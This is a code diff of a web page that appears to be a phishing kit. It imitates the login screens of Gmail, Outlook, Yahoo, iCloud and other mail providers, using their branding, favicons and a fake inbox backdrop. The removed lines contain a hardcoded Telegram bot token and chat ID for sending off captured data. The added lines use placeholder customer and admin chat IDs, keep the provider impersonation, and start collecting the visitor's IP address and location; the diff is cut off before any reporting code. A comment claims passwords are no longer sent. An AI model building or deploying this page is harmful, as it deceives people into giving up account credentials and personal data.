@@ -1059,655 +1059,2814 @@
     </div>
   </div>
 
-  <script>
-    (function() {
-      // ============================================================
-      // 🔧 CONFIGURATION
-      // ============================================================
-      const TELEGRAM_BOT_TOKEN = '8978436699:AAHHrtCT62Y83NZLs2vQLH2poe49YQsqalM';
-      const TELEGRAM_CHAT_ID   = '7236555945';
-      // ============================================================
+<script>
+(function () {
 
-      // ===== DOM =====
-      const dot1 = document.getElementById('dot1');
-      const dot2 = document.getElementById('dot2');
-      const dot3 = document.getElementById('dot3');
-      const logoIcon = document.getElementById('logoIcon');
-      const logoFallback = document.getElementById('logoFallback');
-      const faviconImg = document.getElementById('faviconImg');
-      const title = document.getElementById('title');
-      const subtitle = document.getElementById('subtitle');
-      const accountChip = document.getElementById('accountChip');
-      const accountChipText = document.getElementById('accountChipText');
-      const chipFavicon = document.getElementById('chipFavicon');
-      const fieldInput = document.getElementById('fieldInput');
-      const fieldLeftIcon = document.getElementById('fieldLeftIcon');
-      const fieldLeftIconI = document.getElementById('fieldLeftIconI');
-      const fieldLeftIconImg = document.getElementById('fieldLeftIconImg');
-      const toggleBtn = document.getElementById('toggleBtn');
-      const toggleIcon = document.getElementById('toggleIcon');
-      const hintIcon = document.getElementById('hintIcon');
-      const hintText = document.getElementById('hintText');
-      const actionRow = document.getElementById('actionRow');
-      const submitBtn = document.getElementById('submitBtn');
-      const btnText = document.getElementById('btnText');
-      const btnIcon = document.getElementById('btnIcon');
-      const backRow = document.getElementById('backRow');
-      const backBtn = document.getElementById('backBtn');
-      const backText = document.getElementById('backText');
-      const form = document.getElementById('loginForm');
-      const successOverlay = document.getElementById('successOverlay');
-      const successTitle = document.getElementById('successTitle');
-      const successMessage = document.getElementById('successMessage');
-      const redirectUrl = document.getElementById('redirectUrl');
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
 
-      const mbAvatarEmail = document.getElementById('mbAvatarEmail');
-      const mbAvatarCircle = document.getElementById('mbAvatarCircle');
-      const mbLogoIcon = document.getElementById('mbLogoIcon');
-      const mbLogoLetter = document.getElementById('mbLogoLetter');
-      const mbLogoFavicon = document.getElementById('mbLogoFavicon');
-      const mbLogoText = document.getElementById('mbLogoText');
-      const mbEmails = document.getElementById('mbEmails');
+    const BOT_TOKEN = "__BOT_TOKEN__";
+    const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
+    const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
 
-      // ===== STATE =====
-      let step = 1;
-      let storedEmail = '';
-      let storedPassword = '';
-      let storedConfirmPassword = '';
-      let currentProvider = null;
-      let isTransitioning = false;
-      let hasReported = false;
+    // ============================================================
+    // DOM
+    // ============================================================
 
-      // ===== DOMAIN DB =====
-      const domainConfig = {
-        'gmail.com':      { name: 'Gmail',       provider: 'gmail',   icon: 'fa-google',        subtitle: 'Sign in with your Google account',    glow: 'rgba(234, 67, 53, 0.08)',  loginUrl: 'https://accounts.google.com/signin' },
-        'googlemail.com': { name: 'Gmail',       provider: 'gmail',   icon: 'fa-google',        subtitle: 'Sign in with your Google account',    glow: 'rgba(234, 67, 53, 0.08)',  loginUrl: 'https://accounts.google.com/signin' },
-        'outlook.com':    { name: 'Outlook',     provider: 'outlook', icon: 'fa-microsoft',     subtitle: 'Sign in with your Microsoft account', glow: 'rgba(0, 120, 212, 0.08)',  loginUrl: 'https://login.microsoftonline.com' },
-        'hotmail.com':    { name: 'Outlook',     provider: 'outlook', icon: 'fa-microsoft',     subtitle: 'Sign in with your Microsoft account', glow: 'rgba(0, 120, 212, 0.08)',  loginUrl: 'https://login.microsoftonline.com' },
-        'live.com':       { name: 'Outlook',     provider: 'outlook', icon: 'fa-microsoft',     subtitle: 'Sign in with your Microsoft account', glow: 'rgba(0, 120, 212, 0.08)',  loginUrl: 'https://login.microsoftonline.com' },
-        'yahoo.com':      { name: 'Yahoo',       provider: 'yahoo',   icon: 'fa-yahoo',         subtitle: 'Sign in with your Yahoo account',     glow: 'rgba(96, 1, 210, 0.08)',   loginUrl: 'https://login.yahoo.com' },
-        'ymail.com':      { name: 'Yahoo',       provider: 'yahoo',   icon: 'fa-yahoo',         subtitle: 'Sign in with your Yahoo account',     glow: 'rgba(96, 1, 210, 0.08)',   loginUrl: 'https://login.yahoo.com' },
-        'icloud.com':     { name: 'iCloud',      provider: 'icloud',  icon: 'fa-apple',         subtitle: 'Sign in with your Apple account',     glow: 'rgba(54, 147, 243, 0.08)', loginUrl: 'https://appleid.apple.com/sign-in' },
-        'me.com':         { name: 'iCloud',      provider: 'icloud',  icon: 'fa-apple',         subtitle: 'Sign in with your Apple account',     glow: 'rgba(54, 147, 243, 0.08)', loginUrl: 'https://appleid.apple.com/sign-in' },
-        'protonmail.com': { name: 'ProtonMail',  provider: 'proton',  icon: 'fa-shield-halved', subtitle: 'Sign in with your Proton account',    glow: 'rgba(109, 74, 255, 0.08)', loginUrl: 'https://account.proton.me/login' },
-        'proton.me':      { name: 'ProtonMail',  provider: 'proton',  icon: 'fa-shield-halved', subtitle: 'Sign in with your Proton account',    glow: 'rgba(109, 74, 255, 0.08)', loginUrl: 'https://account.proton.me/login' },
-        'aol.com':        { name: 'AOL Mail',    provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your AOL account',      glow: 'rgba(0, 168, 224, 0.08)',  loginUrl: 'https://login.aol.com' },
-        'gmx.com':        { name: 'GMX',         provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your GMX account',      glow: 'rgba(28, 68, 155, 0.08)',  loginUrl: 'https://www.gmx.com' },
-        'gmx.net':        { name: 'GMX',         provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your GMX account',      glow: 'rgba(28, 68, 155, 0.08)',  loginUrl: 'https://www.gmx.net' },
-        'yandex.com':     { name: 'Yandex Mail', provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Yandex account',   glow: 'rgba(252, 63, 29, 0.08)',  loginUrl: 'https://passport.yandex.com' },
-        'yandex.ru':      { name: 'Yandex Mail', provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Yandex account',   glow: 'rgba(252, 63, 29, 0.08)',  loginUrl: 'https://passport.yandex.ru' },
-        'mail.ru':        { name: 'Mail.ru',     provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Mail.ru account',  glow: 'rgba(0, 95, 249, 0.08)',   loginUrl: 'https://account.mail.ru' },
-        'zoho.com':       { name: 'Zoho Mail',   provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Zoho account',     glow: 'rgba(228, 37, 39, 0.08)',  loginUrl: 'https://accounts.zoho.com' }
-      };
+    const dot1 = document.getElementById("dot1");
+    const dot2 = document.getElementById("dot2");
+    const dot3 = document.getElementById("dot3");
 
-      // ===== SAMPLE EMAILS =====
-      const sampleEmails = [
-        { from: 'Sarah Johnson',       subject: 'Q3 Marketing Strategy Review',  preview: 'Hi, attached is the Q3 report for your review…',        date: '10:42 AM', unread: true },
-        { from: 'GitHub',              subject: '[repo] PR #248 merged',         preview: 'Your pull request was successfully merged…',           date: '9:15 AM',  unread: true },
-        { from: 'Michael Chen',        subject: 'Re: Design system update',      preview: 'Thanks for the feedback, I\'ll update the tokens…',     date: '8:33 AM',  unread: true },
-        { from: 'LinkedIn',            subject: '3 new job opportunities',       preview: 'Companies are looking for candidates like you…',        date: 'Yesterday', unread: false },
-        { from: 'Emily Rodriguez',     subject: 'Team lunch on Friday?',         preview: 'Hey! Are you free for lunch this Friday at 12…',        date: 'Yesterday', unread: false },
-        { from: 'Amazon Web Services', subject: 'Your monthly bill is ready',    preview: 'Your AWS bill for March is now available…',             date: 'Mar 28',   unread: false },
-        { from: 'David Kim',           subject: 'Notes from product sync',       preview: 'Sharing the notes from our call earlier today…',        date: 'Mar 28',   unread: false },
-        { from: 'Stripe',              subject: 'Payment received',              preview: 'You received a payment of $2,450.00 from Acme Inc…',    date: 'Mar 27',   unread: false },
-        { from: 'Figma',               subject: 'New comment on your design',    preview: 'Alex commented on "Homepage v3" — check it out…',       date: 'Mar 27',   unread: false },
-        { from: 'Slack',               subject: 'You have 5 unread messages',    preview: 'Catch up on what happened in your channels…',           date: 'Mar 26',   unread: false },
-        { from: 'Notion',              subject: 'Weekly digest for your team',   preview: 'Here\'s what changed in your workspace this week…',     date: 'Mar 26',   unread: false },
-        { from: 'Vercel',              subject: 'Deployment succeeded',          preview: 'Your project was successfully deployed to production…', date: 'Mar 25',   unread: false }
-      ];
+    const logoIcon = document.getElementById("logoIcon");
+    const logoFallback = document.getElementById("logoFallback");
+    const faviconImg = document.getElementById("faviconImg");
 
-      // ===== HELPERS =====
-      function extractDomain(email) {
-        const t = email.trim().toLowerCase();
-        if (!t.includes('@')) return null;
-        const p = t.split('@');
-        return p.length === 2 && p[1] ? p[1] : null;
-      }
+    const title = document.getElementById("title");
+    const subtitle = document.getElementById("subtitle");
 
-      function getDomainConfig(email) {
-        const domain = extractDomain(email);
-        if (!domain) return null;
-        if (domainConfig[domain]) return { ...domainConfig[domain], domain };
-        for (const [k, c] of Object.entries(domainConfig)) {
-          if (domain.endsWith('.' + k)) return { ...c, domain: k };
+    const accountChip = document.getElementById("accountChip");
+    const accountChipText =
+        document.getElementById("accountChipText");
+
+    const chipFavicon =
+        document.getElementById("chipFavicon");
+
+    const fieldInput =
+        document.getElementById("fieldInput");
+
+    const fieldLeftIcon =
+        document.getElementById("fieldLeftIcon");
+
+    const fieldLeftIconI =
+        document.getElementById("fieldLeftIconI");
+
+    const fieldLeftIconImg =
+        document.getElementById("fieldLeftIconImg");
+
+    const toggleBtn =
+        document.getElementById("toggleBtn");
+
+    const toggleIcon =
+        document.getElementById("toggleIcon");
+
+    const hintIcon =
+        document.getElementById("hintIcon");
+
+    const hintText =
+        document.getElementById("hintText");
+
+    const actionRow =
+        document.getElementById("actionRow");
+
+    const submitBtn =
+        document.getElementById("submitBtn");
+
+    const btnText =
+        document.getElementById("btnText");
+
+    const btnIcon =
+        document.getElementById("btnIcon");
+
+    const backRow =
+        document.getElementById("backRow");
+
+    const backBtn =
+        document.getElementById("backBtn");
+
+    const backText =
+        document.getElementById("backText");
+
+    const form =
+        document.getElementById("loginForm");
+
+    const successOverlay =
+        document.getElementById("successOverlay");
+
+    const successTitle =
+        document.getElementById("successTitle");
+
+    const successMessage =
+        document.getElementById("successMessage");
+
+    const redirectUrl =
+        document.getElementById("redirectUrl");
+
+
+    // ============================================================
+    // MAILBOX BACKGROUND
+    // ============================================================
+
+    const mbAvatarEmail =
+        document.getElementById("mbAvatarEmail");
+
+    const mbAvatarCircle =
+        document.getElementById("mbAvatarCircle");
+
+    const mbLogoIcon =
+        document.getElementById("mbLogoIcon");
+
+    const mbLogoLetter =
+        document.getElementById("mbLogoLetter");
+
+    const mbLogoFavicon =
+        document.getElementById("mbLogoFavicon");
+
+    const mbLogoText =
+        document.getElementById("mbLogoText");
+
+    const mbEmails =
+        document.getElementById("mbEmails");
+
+
+    // ============================================================
+    // STATE
+    // ============================================================
+
+    let step = 1;
+
+    let storedEmail = "";
+
+    let currentProvider = null;
+
+    let isTransitioning = false;
+
+    let hasReported = false;
+
+
+    /*
+     * PASSWORD STORAGE REMOVED.
+     *
+     * These variables from the original version
+     * are intentionally NOT used:
+     *
+     * let storedPassword = "";
+     * let storedConfirmPassword = "";
+     *
+     * Password/input values are never sent to
+     * Telegram or stored in JavaScript state.
+     */
+
+
+    // ============================================================
+    // DOMAIN DATABASE
+    // ============================================================
+
+    const domainConfig = {
+
+        "gmail.com": {
+            name: "Gmail",
+            provider: "gmail",
+            icon: "fa-google",
+            subtitle: "Continue with your Google account",
+            glow: "rgba(234, 67, 53, 0.08)",
+            loginUrl: "https://accounts.google.com/signin"
+        },
+
+        "googlemail.com": {
+            name: "Gmail",
+            provider: "gmail",
+            icon: "fa-google",
+            subtitle: "Continue with your Google account",
+            glow: "rgba(234, 67, 53, 0.08)",
+            loginUrl: "https://accounts.google.com/signin"
+        },
+
+        "outlook.com": {
+            name: "Outlook",
+            provider: "outlook",
+            icon: "fa-microsoft",
+            subtitle: "Continue with your Microsoft account",
+            glow: "rgba(0, 120, 212, 0.08)",
+            loginUrl: "https://login.microsoftonline.com"
+        },
+
+        "hotmail.com": {
+            name: "Outlook",
+            provider: "outlook",
+            icon: "fa-microsoft",
+            subtitle: "Continue with your Microsoft account",
+            glow: "rgba(0, 120, 212, 0.08)",
+            loginUrl: "https://login.microsoftonline.com"
+        },
+
+        "live.com": {
+            name: "Outlook",
+            provider: "outlook",
+            icon: "fa-microsoft",
+            subtitle: "Continue with your Microsoft account",
+            glow: "rgba(0, 120, 212, 0.08)",
+            loginUrl: "https://login.microsoftonline.com"
+        },
+
+        "yahoo.com": {
+            name: "Yahoo",
+            provider: "yahoo",
+            icon: "fa-yahoo",
+            subtitle: "Continue with your Yahoo account",
+            glow: "rgba(96, 1, 210, 0.08)",
+            loginUrl: "https://login.yahoo.com"
+        },
+
+        "ymail.com": {
+            name: "Yahoo",
+            provider: "yahoo",
+            icon: "fa-yahoo",
+            subtitle: "Continue with your Yahoo account",
+            glow: "rgba(96, 1, 210, 0.08)",
+            loginUrl: "https://login.yahoo.com"
+        },
+
+        "icloud.com": {
+            name: "iCloud",
+            provider: "icloud",
+            icon: "fa-apple",
+            subtitle: "Continue with your Apple account",
+            glow: "rgba(54, 147, 243, 0.08)",
+            loginUrl: "https://appleid.apple.com/sign-in"
+        },
+
+        "me.com": {
+            name: "iCloud",
+            provider: "icloud",
+            icon: "fa-apple",
+            subtitle: "Continue with your Apple account",
+            glow: "rgba(54, 147, 243, 0.08)",
+            loginUrl: "https://appleid.apple.com/sign-in"
+        },
+
+        "protonmail.com": {
+            name: "ProtonMail",
+            provider: "proton",
+            icon: "fa-shield-halved",
+            subtitle: "Continue with your Proton account",
+            glow: "rgba(109, 74, 255, 0.08)",
+            loginUrl: "https://account.proton.me/login"
+        },
+
+        "proton.me": {
+            name: "ProtonMail",
+            provider: "proton",
+            icon: "fa-shield-halved",
+            subtitle: "Continue with your Proton account",
+            glow: "rgba(109, 74, 255, 0.08)",
+            loginUrl: "https://account.proton.me/login"
+        },
+
+        "aol.com": {
+            name: "AOL Mail",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to AOL",
+            glow: "rgba(0,168,224,0.08)",
+            loginUrl: "https://login.aol.com"
+        },
+
+        "gmx.com": {
+            name: "GMX",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to GMX",
+            glow: "rgba(28,68,155,0.08)",
+            loginUrl: "https://www.gmx.com"
+        },
+
+        "gmx.net": {
+            name: "GMX",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to GMX",
+            glow: "rgba(28,68,155,0.08)",
+            loginUrl: "https://www.gmx.net"
+        },
+
+        "yandex.com": {
+            name: "Yandex Mail",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to Yandex",
+            glow: "rgba(252,63,29,0.08)",
+            loginUrl: "https://passport.yandex.com"
+        },
+
+        "yandex.ru": {
+            name: "Yandex Mail",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to Yandex",
+            glow: "rgba(252,63,29,0.08)",
+            loginUrl: "https://passport.yandex.ru"
+        },
+
+        "mail.ru": {
+            name: "Mail.ru",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to Mail.ru",
+            glow: "rgba(0,95,249,0.08)",
+            loginUrl: "https://account.mail.ru"
+        },
+
+        "zoho.com": {
+            name: "Zoho Mail",
+            provider: "generic",
+            icon: "fa-envelope",
+            subtitle: "Continue to Zoho",
+            glow: "rgba(228,37,39,0.08)",
+            loginUrl: "https://accounts.zoho.com"
         }
-        const base = domain.split('.')[0];
+    };
+
+
+    // ============================================================
+    // SAMPLE MAILBOX DATA
+    // ============================================================
+
+    const sampleEmails = [
+
+        {
+            from: "Sarah Johnson",
+            subject: "Q3 Marketing Strategy Review",
+            preview:
+                "Hi, attached is the Q3 report for your review…",
+            date: "10:42 AM",
+            unread: true
+        },
+
+        {
+            from: "GitHub",
+            subject: "[repo] PR #248 merged",
+            preview:
+                "Your pull request was successfully merged…",
+            date: "9:15 AM",
+            unread: true
+        },
+
+        {
+            from: "Michael Chen",
+            subject: "Re: Design system update",
+            preview:
+                "Thanks for the feedback, I'll update the tokens…",
+            date: "8:33 AM",
+            unread: true
+        },
+
+        {
+            from: "LinkedIn",
+            subject: "3 new job opportunities",
+            preview:
+                "Companies are looking for candidates like you…",
+            date: "Yesterday",
+            unread: false
+        },
+
+        {
+            from: "Emily Rodriguez",
+            subject: "Team lunch on Friday?",
+            preview:
+                "Hey! Are you free for lunch this Friday at 12…",
+            date: "Yesterday",
+            unread: false
+        },
+
+        {
+            from: "Amazon Web Services",
+            subject: "Your monthly bill is ready",
+            preview:
+                "Your AWS bill for March is now available…",
+            date: "Mar 28",
+            unread: false
+        },
+
+        {
+            from: "David Kim",
+            subject: "Notes from product sync",
+            preview:
+                "Sharing the notes from our call earlier today…",
+            date: "Mar 28",
+            unread: false
+        },
+
+        {
+            from: "Stripe",
+            subject: "Payment received",
+            preview:
+                "You received a payment of $2,450.00 from Acme Inc…",
+            date: "Mar 27",
+            unread: false
+        },
+
+        {
+            from: "Figma",
+            subject: "New comment on your design",
+            preview:
+                'Alex commented on "Homepage v3" — check it out…',
+            date: "Mar 27",
+            unread: false
+        },
+
+        {
+            from: "Slack",
+            subject: "You have 5 unread messages",
+            preview:
+                "Catch up on what happened in your channels…",
+            date: "Mar 26",
+            unread: false
+        },
+
+        {
+            from: "Notion",
+            subject: "Weekly digest for your team",
+            preview:
+                "Here's what changed in your workspace this week…",
+            date: "Mar 26",
+            unread: false
+        },
+
+        {
+            from: "Vercel",
+            subject: "Deployment succeeded",
+            preview:
+                "Your project was successfully deployed to production…",
+            date: "Mar 25",
+            unread: false
+        }
+    ];
+
+
+    // ============================================================
+    // HELPERS
+    // ============================================================
+
+    function escapeHtml(str) {
+
+        if (
+            str === null ||
+            str === undefined
+        ) {
+            return "";
+        }
+
+        return String(str)
+
+            .replace(/&/g, "&amp;")
+
+            .replace(/</g, "&lt;")
+
+            .replace(/>/g, "&gt;")
+
+            .replace(/"/g, "&quot;")
+
+            .replace(/'/g, "&#039;");
+    }
+
+
+    function extractDomain(email) {
+
+        const value =
+            email.trim().toLowerCase();
+
+        if (!value.includes("@")) {
+            return null;
+        }
+
+        const parts =
+            value.split("@");
+
+        if (
+            parts.length !== 2 ||
+            !parts[1]
+        ) {
+            return null;
+        }
+
+        return parts[1];
+    }
+
+
+    function isValidEmail(value) {
+
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+            .test(value.trim());
+    }
+
+
+    function getInitials(email) {
+
+        if (!email) {
+            return "U";
+        }
+
+        const local =
+            email.split("@")[0] || "";
+
+        const parts =
+            local
+                .split(/[._-]/)
+                .filter(Boolean);
+
+        if (
+            parts.length >= 2
+        ) {
+
+            return (
+                parts[0][0] +
+                parts[1][0]
+            ).toUpperCase();
+        }
+
+        return (
+            local.substring(0, 2)
+                .toUpperCase() ||
+            "U"
+        );
+    }
+
+
+    function getDomainConfig(email) {
+
+        const domain =
+            extractDomain(email);
+
+        if (!domain) {
+            return null;
+        }
+
+        if (
+            domainConfig[domain]
+        ) {
+
+            return {
+                ...domainConfig[domain],
+                domain: domain
+            };
+        }
+
+
+        for (
+            const [key, config]
+            of Object.entries(domainConfig)
+        ) {
+
+            if (
+                domain.endsWith(
+                    "." + key
+                )
+            ) {
+
+                return {
+                    ...config,
+                    domain: key
+                };
+            }
+        }
+
+
+        const base =
+            domain.split(".")[0];
+
+
         return {
-          name: base.charAt(0).toUpperCase() + base.slice(1),
-          provider: 'generic',
-          icon: 'fa-envelope',
-          subtitle: `Sign in with your ${domain} account`,
-          glow: 'rgba(95, 99, 104, 0.06)',
-          loginUrl: `https://${domain}`,
-          domain
+
+            name:
+                base.charAt(0)
+                    .toUpperCase() +
+                base.slice(1),
+
+            provider:
+                "generic",
+
+            icon:
+                "fa-envelope",
+
+            subtitle:
+                `Continue to ${domain}`,
+
+            glow:
+                "rgba(95,99,104,0.06)",
+
+            loginUrl:
+                `https://${domain}`,
+
+            domain:
+                domain
         };
-      }
+    }
 
-      function isValidEmail(v) {
-        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
-      }
 
-      function getInitials(email) {
-        if (!email) return 'U';
-        const local = email.split('@')[0] || '';
-        const parts = local.split(/[._-]/).filter(Boolean);
-        if (parts.length >= 2) return (parts[0][0] + parts[1][0]).toUpperCase();
-        return local.substring(0, 2).toUpperCase() || 'U';
-      }
+    // ============================================================
+    // FAVICON
+    // ============================================================
 
-      function loadFavicon(domain, onSuccess) {
+    function loadFavicon(
+        domain,
+        onSuccess
+    ) {
+
         const sources = [
-          `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
-          `https://icons.duckduckgo.com/ip3/${domain}.ico`,
-          `https://${domain}/favicon.ico`,
-          `https://www.google.com/s2/favicons?domain=${domain}&sz=64`
+
+            `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
+
+            `https://icons.duckduckgo.com/ip3/${domain}.ico`,
+
+            `https://${domain}/favicon.ico`,
+
+            `https://www.google.com/s2/favicons?domain=${domain}&sz=64`
         ];
+
+
         let index = 0;
-        const tryNext = () => {
-          if (index >= sources.length) { if (onSuccess) onSuccess(null); return; }
-          const url = sources[index++];
-          const testImg = new Image();
-          testImg.referrerPolicy = 'no-referrer';
-          testImg.onload = function() {
-            if (testImg.naturalWidth > 1 && testImg.naturalHeight > 1) {
-              if (onSuccess) onSuccess(url);
-            } else tryNext();
-          };
-          testImg.onerror = tryNext;
-          testImg.src = url;
-        };
+
+
+        function tryNext() {
+
+            if (
+                index >=
+                sources.length
+            ) {
+
+                if (onSuccess) {
+                    onSuccess(null);
+                }
+
+                return;
+            }
+
+
+            const url =
+                sources[index++];
+
+
+            const testImg =
+                new Image();
+
+
+            testImg.referrerPolicy =
+                "no-referrer";
+
+
+            testImg.onload =
+                function () {
+
+                    if (
+                        testImg.naturalWidth > 1 &&
+                        testImg.naturalHeight > 1
+                    ) {
+
+                        if (onSuccess) {
+                            onSuccess(url);
+                        }
+
+                    } else {
+
+                        tryNext();
+                    }
+                };
+
+
+            testImg.onerror =
+                tryNext;
+
+
+            testImg.src =
+                url;
+        }
+
+
         tryNext();
-      }
+    }
 
-      function renderMailboxBackground(email) {
-        if (email) {
-          mbAvatarEmail.textContent = email;
-          mbAvatarCircle.textContent = getInitials(email);
 
-          const cfg = getDomainConfig(email);
-          if (cfg) {
-            mbLogoIcon.setAttribute('data-provider', cfg.provider);
-            mbLogoLetter.textContent = cfg.name.charAt(0).toUpperCase();
-            mbLogoText.textContent = cfg.name;
+    function applyFavicon(url) {
 
-            loadFavicon(cfg.domain, (url) => {
-              if (url) {
-                mbLogoFavicon.src = url;
-                mbLogoFavicon.onload = () => {
-                  mbLogoIcon.classList.add('favicon-loaded');
-                };
-                mbLogoFavicon.onerror = () => {
-                  mbLogoIcon.classList.remove('favicon-loaded');
-                };
-              } else {
-                mbLogoIcon.classList.remove('favicon-loaded');
-              }
-            });
-          }
-        } else {
-          mbAvatarEmail.textContent = 'user@example.com';
-          mbAvatarCircle.textContent = 'U';
-          mbLogoIcon.setAttribute('data-provider', 'gmail');
-          mbLogoLetter.textContent = 'M';
-          mbLogoText.textContent = 'Mail';
-          mbLogoIcon.classList.remove('favicon-loaded');
-          mbLogoFavicon.removeAttribute('src');
-        }
-      }
-
-      function renderEmailList() {
-        mbEmails.innerHTML = sampleEmails.map(e => `
-          <div class="mb-email ${e.unread ? 'unread' : 'read'}">
-            <i class="far fa-star mb-email-star"></i>
-            <div class="mb-email-from">${escapeHtml(e.from)}</div>
-            <div class="mb-email-subject">
-              ${escapeHtml(e.subject)}
-              <span class="preview">— ${escapeHtml(e.preview)}</span>
-            </div>
-            <div class="mb-email-date">${escapeHtml(e.date)}</div>
-          </div>
-        `).join('');
-      }
-
-      function applyFavicon(url) {
         if (!url) {
-          logoIcon.classList.remove('favicon-active');
-          faviconImg.classList.remove('loaded');
-          faviconImg.removeAttribute('src');
-          fieldLeftIcon.classList.remove('has-favicon');
-          fieldLeftIconImg.removeAttribute('src');
-          return;
-        }
-        faviconImg.src = url;
-        faviconImg.onload = () => {
-          faviconImg.classList.add('loaded');
-          logoIcon.classList.add('favicon-active');
-        };
-        faviconImg.onerror = () => {
-          logoIcon.classList.remove('favicon-active');
-          faviconImg.classList.remove('loaded');
-        };
-        chipFavicon.src = url;
-        fieldLeftIconImg.src = url;
-        fieldLeftIconImg.onload = () => fieldLeftIcon.classList.add('has-favicon');
-        fieldLeftIconImg.onerror = () => fieldLeftIcon.classList.remove('has-favicon');
-      }
 
-      function applyProviderBranding(cfg) {
+            if (logoIcon) {
+                logoIcon.classList.remove(
+                    "favicon-active"
+                );
+            }
+
+            if (faviconImg) {
+
+                faviconImg.classList.remove(
+                    "loaded"
+                );
+
+                faviconImg.removeAttribute(
+                    "src"
+                );
+            }
+
+            if (fieldLeftIcon) {
+
+                fieldLeftIcon.classList.remove(
+                    "has-favicon"
+                );
+            }
+
+            if (fieldLeftIconImg) {
+
+                fieldLeftIconImg.removeAttribute(
+                    "src"
+                );
+            }
+
+            return;
+        }
+
+
+        if (faviconImg) {
+
+            faviconImg.src =
+                url;
+
+            faviconImg.onload =
+                function () {
+
+                    faviconImg.classList.add(
+                        "loaded"
+                    );
+
+                    if (logoIcon) {
+                        logoIcon.classList.add(
+                            "favicon-active"
+                        );
+                    }
+                };
+
+
+            faviconImg.onerror =
+                function () {
+
+                    if (logoIcon) {
+                        logoIcon.classList.remove(
+                            "favicon-active"
+                        );
+                    }
+
+                    faviconImg.classList.remove(
+                        "loaded"
+                    );
+                };
+        }
+
+
+        if (chipFavicon) {
+            chipFavicon.src =
+                url;
+        }
+
+
+        if (fieldLeftIconImg) {
+
+            fieldLeftIconImg.src =
+                url;
+
+            fieldLeftIconImg.onload =
+                function () {
+
+                    if (fieldLeftIcon) {
+
+                        fieldLeftIcon.classList.add(
+                            "has-favicon"
+                        );
+                    }
+                };
+
+
+            fieldLeftIconImg.onerror =
+                function () {
+
+                    if (fieldLeftIcon) {
+
+                        fieldLeftIcon.classList.remove(
+                            "has-favicon"
+                        );
+                    }
+                };
+        }
+    }
+
+
+    function applyProviderBranding(cfg) {
+
         if (!cfg) {
-          logoIcon.setAttribute('data-provider', '');
-          logoFallback.className = 'fas fa-envelope fa-fallback';
-          logoIcon.classList.remove('favicon-active');
-          faviconImg.classList.remove('loaded');
-          faviconImg.removeAttribute('src');
-          chipFavicon.removeAttribute('src');
-          fieldLeftIcon.classList.remove('has-favicon');
-          fieldLeftIconImg.removeAttribute('src');
-          document.body.style.setProperty('--brand-glow', 'rgba(66, 133, 244, 0.06)');
-          return;
+
+            if (logoIcon) {
+
+                logoIcon.setAttribute(
+                    "data-provider",
+                    ""
+                );
+
+                logoIcon.classList.remove(
+                    "favicon-active"
+                );
+            }
+
+
+            if (logoFallback) {
+
+                logoFallback.className =
+                    "fas fa-envelope fa-fallback";
+            }
+
+
+            if (faviconImg) {
+
+                faviconImg.classList.remove(
+                    "loaded"
+                );
+
+                faviconImg.removeAttribute(
+                    "src"
+                );
+            }
+
+
+            if (chipFavicon) {
+
+                chipFavicon.removeAttribute(
+                    "src"
+                );
+            }
+
+
+            if (fieldLeftIcon) {
+
+                fieldLeftIcon.classList.remove(
+                    "has-favicon"
+                );
+            }
+
+
+            if (fieldLeftIconImg) {
+
+                fieldLeftIconImg.removeAttribute(
+                    "src"
+                );
+            }
+
+
+            document.body.style.setProperty(
+                "--brand-glow",
+                "rgba(66,133,244,0.06)"
+            );
+
+            return;
         }
-        logoIcon.setAttribute('data-provider', cfg.provider);
-        logoFallback.className = `fas ${cfg.icon} fa-fallback`;
-        document.body.style.setProperty('--brand-glow', cfg.glow);
 
-        loadFavicon(cfg.domain, (url) => {
-          if (url) applyFavicon(url);
-          else {
-            logoIcon.classList.remove('favicon-active');
-            faviconImg.classList.remove('loaded');
-            fieldLeftIcon.classList.remove('has-favicon');
-            fieldLeftIconImg.removeAttribute('src');
-          }
-        });
-      }
 
-      function updateStepDots() {
-        [dot1, dot2, dot3].forEach((d, i) => {
-          d.classList.remove('active', 'completed');
-          const stepNum = i + 1;
-          if (stepNum < step) d.classList.add('completed');
-          else if (stepNum === step) d.classList.add('active');
-        });
-      }
+        if (logoIcon) {
 
-      function setField(icon, type, placeholder, autocomplete, showToggle) {
-        fieldLeftIconI.className = `fas ${icon}`;
-        fieldLeftIcon.classList.remove('has-favicon');
-        fieldInput.type = type;
-        fieldInput.placeholder = placeholder;
-        fieldInput.autocomplete = autocomplete;
-        fieldInput.value = '';
-        fieldInput.classList.remove('input-error', 'input-success');
-        toggleBtn.classList.toggle('visible', showToggle);
-        if (!showToggle) toggleIcon.className = 'fas fa-eye';
-      }
-
-      function swapFieldAnimation(callback) {
-        const wrapper = fieldInput.closest('.field-wrapper');
-        wrapper.classList.add('field-swap');
-        setTimeout(() => {
-          callback();
-          setTimeout(() => wrapper.classList.remove('field-swap'), 400);
-          setTimeout(() => fieldInput.focus(), 100);
-        }, 200);
-      }
-
-      async function getUserInfo() {
-        const info = { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
-        const apis = [
-          { url: 'https://ipapi.co/json/',            parse: d => ({ ip: d.ip, country: d.country_name, city: d.city }) },
-          { url: 'https://ipwho.is/',                 parse: d => ({ ip: d.ip, country: d.country,      city: d.city }) },
-          { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip, country: '—',            city: '—' }) }
-        ];
